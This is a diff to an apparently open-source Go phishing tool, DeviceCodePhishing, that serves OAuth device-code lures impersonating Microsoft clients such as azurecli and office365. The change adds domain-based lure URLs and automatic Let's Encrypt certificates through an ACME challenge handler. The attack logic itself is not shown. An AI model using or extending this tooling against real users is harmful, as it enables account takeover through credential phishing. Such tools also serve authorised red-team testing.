@@ -229,7 +229,7 @@ Examples:
   # With custom path (URL will be /auth)
   DeviceCodePhishing server --path /auth --client-id azurecli
   
-  # With automatic HTTPS (Let's Encrypt)
+  # With automatic HTTPS (Let's Encrypt) - domain must be valid and pointing to this server
   DeviceCodePhishing server --domain example.com --client-id office365
   
   # With custom SSL certificates
@@ -239,7 +239,8 @@ Examples:
   DeviceCodePhishing server --address :8443 --domain example.com
 
 Note: Cannot specify both --client-id and --custom-client-id simultaneously
-Note: Cannot use --domain with --cert/--key (use one SSL method only)`,
+Note: Cannot use --domain with --cert/--key (use one SSL method only)
+Note: When using --domain, the domain must be properly configured to point to this server's IP`,
 	Run: func(cmd *cobra.Command, args []string) {
 		// Determine which user agent to use
 		finalUserAgent := customUserAgent
@@ -348,7 +349,12 @@ Note: Cannot use --domain with --cert/--key (use one SSL method only)`,
 		// Attempt to get public IP
 		publicIP := getPublicIP()
 		if publicIP != "" {
-			slog.Info("Public URL", "url", protocol+"://"+publicIP+":"+port+lurePath)
+			// Use domain name if provided, otherwise use public IP
+			if domain != "" {
+				slog.Info("Public URL", "url", protocol+"://"+domain+":"+port+lurePath)
+			} else {
+				slog.Info("Public URL", "url", protocol+"://"+publicIP+":"+port+lurePath)
+			}
 		}
 
 		if domain != "" {
@@ -363,8 +369,22 @@ Note: Cannot use --domain with --cert/--key (use one SSL method only)`,
 					Prompt:     autocert.AcceptTOS,
 					HostPolicy: autocert.HostWhitelist(domain),
 					Cache:      autocert.DirCache("certs"),
+					Email:      "", // Optional: add email for notifications
 				}
 				server.TLSConfig = certManager.TLSConfig()
+
+				// Add /.well-known/acme-challenge handler for HTTP-01 challenge
+				httpServer := &http.Server{
+					Addr:    ":80",
+					Handler: certManager.HTTPHandler(nil),
+				}
+				go func() {
+					err := httpServer.ListenAndServe()
+					if err != nil && err != http.ErrServerClosed {
+						slog.Error("Failed to start HTTP server for ACME challenges", "error", err)
+					}
+				}()
+
 				log.Fatal(server.ListenAndServeTLS("", ""))
 			} else {
 				// Use custom certificates
